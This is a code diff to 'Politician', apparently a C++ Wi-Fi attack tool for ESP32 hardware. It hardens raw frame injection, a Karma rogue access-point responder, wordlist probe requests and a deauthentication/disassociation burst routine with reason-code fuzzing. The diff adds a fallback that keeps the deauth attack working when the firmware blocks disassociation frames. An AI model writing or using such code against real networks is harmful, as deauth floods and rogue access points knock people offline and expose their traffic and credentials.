@@ -116,6 +116,13 @@ bool Politician::_txRaw(wifi_interface_t iface, const void *buf, uint16_t len) {
         _stats.tx_packets++;
         return true;
     }
+    if (err == ESP_ERR_INVALID_ARG) {
+        if (_stats.tx_unsupported == 0) {
+            uint8_t fc0 = static_cast<const uint8_t *>(buf)[0];
+            _log("[TX] Frame subtype 0x%02X rejected by ieee80211_raw_frame_sanity_check (ESP_ERR_INVALID_ARG)\n", fc0);
+        }
+        _stats.tx_unsupported++;
+    }
     _stats.tx_dropped++;
     return false;
 }
@@ -644,7 +651,12 @@ Error Politician::injectCustomFrame(const uint8_t *payload, size_t len, uint8_t 
         _channel = channel;
         _rxChannel = channel;
         _lastHopMs = millis();
-        _txRaw(WIFI_IF_STA, payload, (uint16_t)len);
+        if (!_txRaw(WIFI_IF_STA, payload, (uint16_t)len)) {
+            _log("[Inject] Failed to transmit %d bytes on ch%d (subtype 0x%02X rejected or TX queue full)\n",
+                 (int)len, channel, payload[0]);
+            xSemaphoreGiveRecursive(_lock);
+            return ERR_INVALID_ARG;
+        }
         _log("[Inject] Transmitted %d bytes on ch%d\n", (int)len, channel);
         if (lock_ms > 0) {
             // Temporarily lock the hopper for this duration
@@ -845,7 +857,7 @@ void Politician::_sendProbeRequest(const uint8_t *bssid, const char *ssid, uint8
     frame[p++] = 0x01; frame[p++] = 0x08;     // Supported Rates IE
     frame[p++] = 0x82; frame[p++] = 0x84; frame[p++] = 0x8b; frame[p++] = 0x96;
     frame[p++] = 0x0c; frame[p++] = 0x12; frame[p++] = 0x18; frame[p++] = 0x24;
-    _txRaw(WIFI_IF_STA, frame, p);
+    if (!_txRaw(WIFI_IF_STA, frame, p)) return;
     if (ssid && ssid_len > 0)
         _log("[Probe] Wordlist probe '%.*s' -> %02X:%02X:%02X:%02X:%02X:%02X\n",
             ssid_len, ssid, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
@@ -927,12 +939,13 @@ void Politician::_sendKarmaResponse(const uint8_t *client, const char *ssid,
         _channel = channel;
     }
 
-    _txRaw(WIFI_IF_AP, frame, p);
+    bool probeRespSent = _txRaw(WIFI_IF_AP, frame, p);
 
     // ── Beacon (one burst to the same frame, DA flipped to broadcast) ────────
     frame[0] = 0x80; frame[1] = 0x00;  // FC: Beacon
     memset(frame + 4, 0xFF, 6);         // DA: broadcast
-    _txRaw(WIFI_IF_AP, frame, p);
+    bool beaconSent = _txRaw(WIFI_IF_AP, frame, p);
+    if (!probeRespSent && !beaconSent) return;
 
     if (_karmaCb) {
         KarmaRecord rec;
@@ -1075,8 +1088,12 @@ void Politician::tick() {
             uint8_t cur_idx = read_idx;
             read_idx = (read_idx + 1) % MAX_INJECT_QUEUE;
             if (slot.active && slot.channel == _channel) {
-                _txRaw(WIFI_IF_STA, slot.payload, slot.len);
-                _log("[Inject] Transmitted queued %d bytes on ch%d\n", slot.len, _channel);
+                if (_txRaw(WIFI_IF_STA, slot.payload, slot.len)) {
+                    _log("[Inject] Transmitted queued %d bytes on ch%d\n", slot.len, _channel);
+                } else {
+                    _log("[Inject] Queued frame (%d bytes, subtype 0x%02X) failed on ch%d\n",
+                         slot.len, slot.payload[0], _channel);
+                }
                 slot.active = false;
                 if (slot.lock_ms > 0) {
                     _m1Locked = true;
@@ -2859,16 +2876,26 @@ void Politician::_sendDeauthBurst(uint8_t count, const uint8_t *sta) {
     static const uint8_t REASONS[] = { 7, 1, 2, 4, 8, 15 };
     uint8_t num_reasons = sizeof(REASONS) / sizeof(REASONS[0]);
 
+    bool disassocBlocked = false;
     for (int i = 0; i < count; i++) {
-        deauth[0] = (i % 2 == 0) ? 0xC0 : 0xA0; // Alternate between Deauth (0xC0) and Disassoc (0xA0)
+        bool tryDisassoc = (!disassocBlocked && (i % 2 != 0));
+        deauth[0] = tryDisassoc ? 0xA0 : 0xC0; // Alternate between Deauth (0xC0) and Disassoc (0xA0) when supported
         deauth[22] = (i << 4) & 0xFF;
         if (_cfg.deauth_reason_cycling) {
             deauth[24] = REASONS[i % num_reasons];
         }
-        _txRaw(WIFI_IF_STA, deauth, sizeof(deauth));
+        if (!_txRaw(WIFI_IF_STA, deauth, sizeof(deauth)) && tryDisassoc) {
+            // Fall back to Deauth (0xC0) when libnet80211.a blocks Disassoc (0xA0)
+            disassocBlocked = true;
+            deauth[0] = 0xC0;
+            _txRaw(WIFI_IF_STA, deauth, sizeof(deauth));
+        }
         vTaskDelay(1);
     }
-    _log("[Deauth] Sent %s burst (Deauth/Disassoc) on ch%d (%s)\n", _cfg.deauth_reason_cycling ? "Fuzzing" : "Static", _fishChannel, (da[0] == 0xFF) ? "broadcast" : "unicast");
+    _log("[Deauth] Sent %s burst (%s) on ch%d (%s)\n",
+         _cfg.deauth_reason_cycling ? "Fuzzing" : "Static",
+         disassocBlocked ? "Deauth-only fallback" : "Deauth/Disassoc",
+         _fishChannel, (da[0] == 0xFF) ? "broadcast" : "unicast");
 }
 
 void Politician::_markCapturedSsidGroup(const char *ssid, uint8_t ssid_len) {
